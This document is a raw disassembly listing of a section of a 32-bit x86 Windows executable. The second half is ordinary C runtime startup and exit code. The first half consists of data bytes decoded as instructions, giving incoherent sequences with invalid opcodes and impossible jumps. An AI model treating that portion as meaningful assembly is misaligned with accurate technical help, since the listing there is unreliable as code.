  422497:	mov    eax,ds:0x8bd8a65
  42249c:	rcr    DWORD PTR [ecx],1
  42249e:	dec    esi
  42249f:	jae    0x4224fe
  4224a1:	sub    DWORD PTR [eax+0x3bff8107],edi
  4224a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224a8:	sbb    DWORD PTR [ebp+edx*8-0x5690ff1d],0x7fdd5270
  4224b3:	std    
  4224b4:	imul   ebp,DWORD PTR [eax+ecx*1+0x43d001e9],0x48
  4224bc:	je     0x42251e
  4224be:	jecxz  0x422511
  4224c0:	or     BYTE PTR [edx+ebp*2+0x67],ch
  4224c4:	jmp    0xf4c603c6
  4224c9:	mov    esi,0x4f4357d7
  4224ce:	shr    dh,0xfe
  4224d1:	sbb    ah,BYTE PTR [esi+edx*4+0x73]
  4224d5:	ja     0x42251c
  4224d7:	fcom   QWORD PTR [edi-0x6e]
  4224da:	aad    0x95
  4224dc:	cmp    eax,0x55381510
  4224e1:	mov    esi,0xabb086ae
  4224e6:	cmp    eax,0xf257923c
  4224eb:	into   
  4224ec:	sbb    ebx,DWORD PTR [ebp-0x188d26cf]
  4224f2:	add    eax,0xd121adc6
  4224f7:	fs out dx,eax
  4224f9:	mul    DWORD PTR [ebx+0x36]
  4224fc:	in     eax,0xca
  4224fe:	aam    0xbb
  422500:	sbb    al,0xaa
  422502:	shr    DWORD PTR [edx-0x17],cl
  422505:	adc    al,0x1d
  422507:	pop    edx
  422508:	add    al,0x3
  42250a:	sub    esp,DWORD PTR ds:0x8ebf151
  422510:	jle    0x422535
  422512:	repz xchg esp,eax
  422514:	dec    ecx
  422515:	sbb    ebx,DWORD PTR [eax+0x34]
  422518:	dec    esp
  422519:	in     eax,dx
  42251a:	xchg   edi,eax
  42251b:	pop    ss
  42251c:	in     eax,0xbf
  42251e:	mov    ah,0x86
  422520:	int3   
  422521:	retf   0xa3ee
  422524:	fisttp DWORD PTR [ebx+0x8eb3c3d]
  42252a:	dec    eax
  42252b:	ror    BYTE PTR [edx],cl
  42252d:	cs out dx,al
  42252f:	jb     0x422527
  422531:	sub    bl,BYTE PTR [esi]
  422533:	retf   0x311
  422536:	scas   al,BYTE PTR es:[edi]
  422537:	neg    BYTE PTR [edx-0x69]
  42253a:	popa   
  42253b:	pop    ss
  42253c:	cdq    
  42253d:	jle    0x42259c
  42253f:	cmp    BYTE PTR [ebx+edi*1-0x6f739318],ch
  422546:	imul   ebx,DWORD PTR [eax],0xf6ef9f5e
  42254c:	jae    0x422509
  42254e:	shr    dh,0x85
  422551:	dec    edx
  422552:	out    dx,al
  422553:	test   al,0x1e
  422555:	add    DWORD PTR [ebx+0x31],edi
  422558:	(bad)  
  422559:	push   ecx
  42255a:	les    ebp,FWORD PTR [esi+0x7330b583]
  422560:	sbb    DWORD PTR [edx+ebx*8+0x56d27913],eax
  422567:	dec    esi
  422568:	sbb    eax,0x3d8099d9
  42256d:	cwde   
  42256e:	scas   al,BYTE PTR es:[edi]
  42256f:	mov    edi,0xf214168d
  422574:	mov    esi,0x95299c30
  422579:	push   ebp
  42257a:	or     DWORD PTR [edx-0x69],ebx
  42257d:	pop    esp
  42257e:	and    al,0x5a
  422580:	add    cl,dl
  422582:	pop    edx
  422583:	jg     0x422560
  422585:	mov    eax,ds:0x3a24125d
  42258a:	jae    0x4225e0
  42258c:	inc    ebp
  42258d:	lds    esi,FWORD PTR [esi*4-0x602086da]
  422594:	out    0xe,eax
  422596:	sub    bl,BYTE PTR [ebx]
  422598:	inc    eax
  422599:	xor    eax,0xdd523cb5
  42259e:	fild   DWORD PTR [ebx+0x28d12740]
  4225a4:	and    bl,bl
  4225a6:	sub    eax,0x992c8bef
  4225ab:	push   edi
  4225ac:	mov    ah,0xdc
  4225ae:	push   ss
  4225af:	js     0x422621
  4225b1:	(bad)  
  4225b3:	sbb    BYTE PTR [ecx+0x5188f5d6],0x88
  4225ba:	xlat   BYTE PTR ds:[ebx]
  4225bb:	adc    ebx,ebp
  4225bd:	loope  0x422611
  4225bf:	add    DWORD PTR [esi+eiz*1],0xa622b108
  4225c6:	pop    eax
  4225c7:	(bad)  
  4225c9:	dec    esi
  4225ca:	stos   BYTE PTR es:[edi],al
  4225cb:	not    BYTE PTR [ecx+0x8]
  4225ce:	fwait
  4225cf:	mov    al,0xb9
  4225d1:	mov    ebx,0x9bccde9e
  4225d6:	inc    eax
  4225d7:	push   0xea2c2a13
  4225dc:	push   ss
  4225dd:	xchg   edx,eax
  4225de:	dec    eax
  4225df:	sub    BYTE PTR es:[esi-0x12a9c902],dl
  4225e6:	or     esi,DWORD PTR [ecx]
  4225e8:	shl    BYTE PTR [edx-0x5e1a89a4],0xf0
  4225ef:	adc    BYTE PTR [edi],ah
  4225f1:	es xor al,0x65
  4225f4:	cdq    
  4225f5:	pop    ds
  4225f6:	fist   DWORD PTR [edi-0x39080a90]
  4225fc:	(bad)  
  4225fe:	cdq    
  4225ff:	out    0x49,al
  422601:	sub    eax,edx
  422603:	pop    ds
  422604:	mov    eax,0xf32b0012
  422609:	test   al,0xe0
  42260b:	dec    esi
  42260c:	mov    edx,0xa38cf584
  422611:	in     al,dx
  422612:	call   0xa7ae:0x1c1f1dc7
  422619:	add    BYTE PTR [bp+di-0x6f3a],0x2
  42261f:	mov    esi,0x2c694376
  422624:	(bad)  [eax]
  422626:	std    
  422627:	add    al,0x29
  422629:	jno    0x42266f
  42262b:	stc    
  42262c:	and    al,0x61
  42262e:	mov    DWORD PTR [ebx+ebx*4-0x26],ebp
  422632:	cmp    al,0x7c
  422634:	add    al,0x7c
  422636:	mov    eax,0x9ac9d09c
  42263b:	mov    dh,0x39
  42263d:	cmp    eax,0x9f49acbf
  422642:	pop    edi
  422643:	jle    0x42266b
  422645:	pop    eax
  422646:	mov    edx,0x2eab865c
  42264b:	jne    0x4225d6
  42264d:	mov    ds:0x5cf56f3c,al
  422652:	cwde   
  422653:	mov    edi,0x71c6153
  422658:	mov    al,0xe0
  42265a:	mov    ecx,0xebf3da86
  42265f:	pusha  
  422660:	aam    0xa6
  422662:	pop    ss
  422663:	icebp  
  422664:	and    ch,BYTE PTR [esi]
  422666:	pusha  
  422667:	out    0x4a,eax
  422669:	cmp    eax,ebx
  42266b:	test   DWORD PTR [ecx-0x38],esi
  42266e:	das    
  42266f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422670:	push   0xffffffe1
  422672:	inc    ecx
  422673:	imul   ebp,edi,0x14
  422676:	mov    WORD PTR [edx],ss
  422678:	add    ah,ah
  42267a:	push   esp
  42267b:	int3   
  42267c:	imul   esp,DWORD PTR [edi],0x8bf6b921
  422682:	mov    esi,DWORD PTR [ecx]
  422684:	sub    al,0x5c
  422686:	sub    DWORD PTR [ebx+ebx*1-0xf],0xfffffffb
  42268b:	int3   
  42268c:	pop    es
  42268d:	mov    ah,0x93
  42268f:	mov    edx,0xc7ff769d
  422694:	das    
  422695:	in     eax,dx
  422696:	and    ebx,DWORD PTR [ecx-0x30]
  422699:	jp     0x42269d
  42269b:	or     eax,edx
  42269d:	jg     0x42262e
  42269f:	fiadd  DWORD PTR [ecx-0x60489eb8]
  4226a5:	std    
  4226a6:	pusha  
  4226a7:	out    0xee,eax
  4226a9:	cmp    BYTE PTR [ebp+esi*4+0x63],0xfa
  4226ae:	sbb    BYTE PTR [esi-0x47],bl
  4226b1:	mov    edx,0x239479cd
  4226b6:	int3   
  4226b7:	pop    ebp
  4226b8:	sbb    al,0xce
  4226ba:	lea    ebp,[ebx]
  4226bc:	or     eax,0x26001cc7
  4226c1:	in     al,0x46
  4226c3:	es mov ebx,0x1de8cfd6
  4226c9:	popf   
  4226ca:	mov    es,WORD PTR [esi]
  4226cc:	fwait
  4226cd:	mov    dl,0x87
  4226cf:	push   esp
  4226d0:	pop    eax
  4226d1:	pop    ebp
  4226d2:	jle    0x422663
  4226d4:	pop    eax
  4226d5:	add    BYTE PTR [eax+0x6a],al
  4226d8:	(bad)  
  4226da:	pmulhw mm3,QWORD PTR [esi]
  4226dd:	xchg   edi,eax
  4226de:	pcmpeqd mm3,QWORD PTR [ecx+ebp*1-0x6]
  4226e3:	cmp    edx,edx
  4226e5:	lea    esi,[esp+eiz*4+0x4062abe8]
  4226ec:	mov    esp,0x94bc8b6
  4226f1:	or     DWORD PTR [eax+0x1],eax
  4226f4:	push   es
  4226f5:	inc    edx
  4226f6:	and    BYTE PTR [ecx+0x1d],bh
  4226f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226fa:	mov    ds:0x8e167576,eax
  4226ff:	fs xor al,0x1
  422702:	xlat   BYTE PTR ds:[ebx]
  422703:	pop    esi
  422704:	(bad)  
  422705:	cmp    ah,dl
  422707:	fnstcw WORD PTR [esi-0x1717335c]
  42270d:	je     0x422781
  42270f:	push   ecx
  422710:	sub    edi,DWORD PTR [ebx-0x25bce736]
  422716:	jae    0x4226f2
  422718:	rcl    BYTE PTR [ebp-0x3d909ff9],cl
  42271e:	leave  
  42271f:	rcr    BYTE PTR [edi],0xbd
  422722:	pop    ecx
  422723:	inc    DWORD PTR [ecx+0xc]
  422726:	and    DWORD PTR [esi+0x2619128f],esi
  42272c:	and    eax,0xfbcdb3ec
  422731:	inc    ebp
  422732:	inc    ebp
  422733:	mov    ch,0xa1
  422735:	add    ecx,ebx
  422737:	out    0x1a,al
  422739:	inc    ebx
  42273a:	mov    ch,0x7b
  42273c:	and    al,0x19
  42273e:	rol    DWORD PTR [ebx+edi*8+0x3],0xaa
  422743:	test   eax,0xf69ad5c3
  422748:	popf   
  422749:	in     al,dx
  42274a:	test   eax,0x44085343
  42274f:	jecxz  0x422716
  422751:	psllq  mm1,0x3
  422755:	and    eax,edx
  422757:	mov    bh,0x9c
  422759:	sub    eax,0x4f6b7a95
  42275e:	push   esp
  42275f:	popf   
  422760:	push   ds
  422761:	mul    dl
  422763:	aas    
  422764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422766:	xchg   BYTE PTR ds:0x904ea244,dh
  42276c:	into   
  42276d:	cdq    
  42276e:	and    DWORD PTR [esi],edi
  422770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422771:	and    DWORD PTR [ebp-0x1d058aa3],esi
  422777:	(bad)  
  422778:	out    dx,eax
  422779:	jns    0x422795
  42277b:	adc    ebp,DWORD PTR [edx+edi*4-0x3c373395]
  422782:	cli    
  422783:	scas   eax,DWORD PTR es:[edi]
  422784:	xchg   ebp,eax
  422785:	hlt    
  422786:	je     0x42275e
  422788:	add    DWORD PTR [ecx-0x5a],0x6b
  42278c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42278d:	push   cs
  42278e:	aas    
  42278f:	inc    eax
  422790:	test   BYTE PTR [edi-0x2563c6ae],cl
  422796:	sub    ebx,DWORD PTR [edi+0x2ffaca80]
  42279c:	push   ebp
  42279d:	mov    ebp,0x5ab30676
  4227a2:	aas    
  4227a3:	sbb    esi,eax
  4227a5:	(bad)  
  4227a6:	sbb    eax,0xa56eaab4
  4227ab:	mov    edi,0x5a4cef4b
  4227b0:	imul   ecx,DWORD PTR [ecx+ebp*4-0xc],0x9665ca8d
  4227b8:	mov    edx,0x38c3dd47
  4227bd:	xchg   esp,eax
  4227be:	sbb    BYTE PTR [ebx+esi*1-0x18],0xe5
  4227c3:	inc    dh
  4227c5:	fldenv [edx]
  4227c7:	jbe    0x4227ef
  4227c9:	jg     0x4227f2
  4227cb:	inc    esi
  4227cc:	mov    bh,BYTE PTR [esi+0x1]
  4227cf:	adc    al,0x40
  4227d1:	std    
  4227d2:	push   es
  4227d3:	push   edi
  4227d4:	cmp    al,0x34
  4227d6:	xor    al,0x2d
  4227d8:	xlat   BYTE PTR ds:[ebx]
  4227d9:	mov    al,ds:0x4a0cdfcd
  4227de:	sub    BYTE PTR [ebp+0x29],dl
  4227e1:	jne    0x422849
  4227e3:	loop   0x422795
  4227e5:	jne    0x422800
  4227e7:	shr    DWORD PTR [eax+0x3472b23d],0xeb
  4227ee:	into   
  4227ef:	and    DWORD PTR [ecx],eax
  4227f1:	pop    ebp
  4227f2:	or     DWORD PTR [edx],0x364c8c6d
  4227f8:	lea    esp,[ecx-0x6b47e654]
  4227fe:	hlt    
  4227ff:	(bad)  
  422800:	and    BYTE PTR [ebx],bh
  422802:	lea    edi,[eax+0x5e4af472]
  422808:	and    al,0xa9
  42280a:	loopne 0x4227c0
  42280c:	or     al,0xe6
  42280e:	pop    ss
  42280f:	sbb    eax,0x9a78fa92
  422814:	mov    bh,0xf6
  422816:	fiadd  WORD PTR [edx]
  422818:	in     eax,0xfe
  42281a:	xor    eax,0xf3bd163c
  42281f:	dec    ecx
  422820:	adc    bl,BYTE PTR [edi+0x73]
  422823:	or     dh,BYTE PTR [esi+ebp*8+0x1837f5c1]
  42282a:	xchg   edi,eax
  42282b:	hlt    
  42282c:	mov    bl,BYTE PTR [esi-0x67]
  42282f:	in     al,0x6e
  422831:	xchg   ebx,eax
  422832:	inc    esi
  422833:	mov    ebx,0xa89e9c9e
  422838:	mov    WORD PTR [ebx-0x6de9482a],fs
  42283e:	xor    DWORD PTR [ebx+ebx*8],eax
  422841:	adc    DWORD PTR [ebp+edi*2-0x76],ebp
  422845:	das    
  422846:	inc    eax
  422847:	popa   
  422848:	gs mov bh,0xc1
  42284b:	mov    ds:0x9f7287e4,eax
  422850:	into   
  422851:	cmp    al,0xfd
  422853:	out    0xed,eax
  422855:	add    DWORD PTR [esi-0x29cd1ad5],0x18
  42285c:	jo     0x4228b7
  42285e:	mov    eax,ds:0xb409df0d
  422863:	xor    DWORD PTR [eax+0x30e9c830],edi
  422869:	std    
  42286a:	daa    
  42286b:	int    0x2
  42286d:	mov    ebx,0x383c6e38
  422872:	sub    dh,bl
  422874:	mov    ebp,0x82175001
  422879:	sub    cl,BYTE PTR [edi]
  42287b:	outs   dx,BYTE PTR ds:[esi]
  42287c:	mov    WORD PTR [esi+0x15d90b38],cs
  422882:	enter  0x2cbe,0x9f
  422886:	mov    eax,DWORD PTR [ebx-0x289bec11]
  42288c:	test   DWORD PTR [eax-0x7f],0xf22740c7
  422893:	push   ebp
  422894:	inc    edi
  422895:	push   0xffffffc7
  422897:	push   es
  422898:	mov    ch,0x88
  42289a:	fiadd  DWORD PTR [edi]
  42289c:	out    dx,al
  42289d:	inc    ecx
  42289e:	ror    BYTE PTR [ebp+0xba40795],0xd9
  4228a5:	and    DWORD PTR [bp-0x77],0x3b
  4228aa:	and    ebx,ebp
  4228ac:	test   BYTE PTR [edx-0x52],bh
  4228af:	lods   al,BYTE PTR ds:[esi]
  4228b0:	xchg   eax,ecx
  4228b2:	or     edx,DWORD PTR [eax+0x6ebf9339]
  4228b8:	inc    esi
  4228b9:	es pop esp
  4228bb:	mov    eax,0x5a3bd470
  4228c0:	lods   eax,DWORD PTR ds:[esi]
  4228c1:	mov    WORD PTR [ecx],ds
  4228c3:	call   0x98e83e17
  4228c8:	xlat   BYTE PTR ds:[ebx]
  4228c9:	test   BYTE PTR [esp+ebp*8],ah
  4228cc:	xor    DWORD PTR [edx],0x5c
  4228cf:	mov    ch,BYTE PTR [ebp+0x1d289537]
  4228d5:	mov    bh,0xac
  4228d8:	and    eax,0xc94f34ff
  4228dd:	int3   
  4228de:	pusha  
  4228df:	add    dl,BYTE PTR [ebx+eiz*2+0x12]
  4228e3:	pop    es
  4228e4:	dec    ebp
  4228e5:	dec    esi
  4228e6:	icebp  
  4228e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228e8:	pop    edi
  4228e9:	adc    DWORD PTR [edx-0x38e818b2],ebx
  4228ef:	dec    ecx
  4228f0:	adc    al,0xd6
  4228f2:	inc    ebx
  4228f3:	cld    
  4228f4:	xchg   DWORD PTR [esi+0x34],edi
  4228f7:	mov    ss,WORD PTR [ebx]
  4228f9:	fbstp  TBYTE PTR [edx]
  4228fb:	in     al,dx
  4228fc:	push   eax
  4228fd:	les    ecx,FWORD PTR [esi+0x43]
  422900:	rcr    BYTE PTR [bp+si],1
  422903:	mov    eax,ds:0x7b7e55e9
  422908:	sub    BYTE PTR [ecx],al
  42290a:	fistp  WORD PTR [eax]
  42290c:	and    bl,0x6f
  42290f:	int    0xa4
  422911:	mov    esi,ebx
  422913:	out    dx,eax
  422914:	mov    al,ds:0xe58bc033
  422919:	pop    ebp
  42291a:	ret    0x10
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
